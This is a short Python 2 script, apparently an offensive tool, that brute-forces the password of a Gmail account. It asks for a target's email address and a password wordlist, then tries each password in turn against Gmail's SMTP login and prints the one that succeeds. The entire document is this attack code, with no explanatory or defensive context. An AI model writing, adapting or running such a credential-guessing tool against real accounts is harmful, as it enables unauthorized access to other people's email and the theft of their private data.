import smtplib
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)      
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("enter the targets email adress :")
passwfile = raw_input("enter th password file name :")
passwfile = open(passwfile, "r")

for password in passwfile:
	try:
	     smtpserver.login(user, password)

	     print "[+] password found: %s" % password
             break
        except smtplib.SMTPAuthenticationError:
	     print " [!] password incorrect: %s" % password
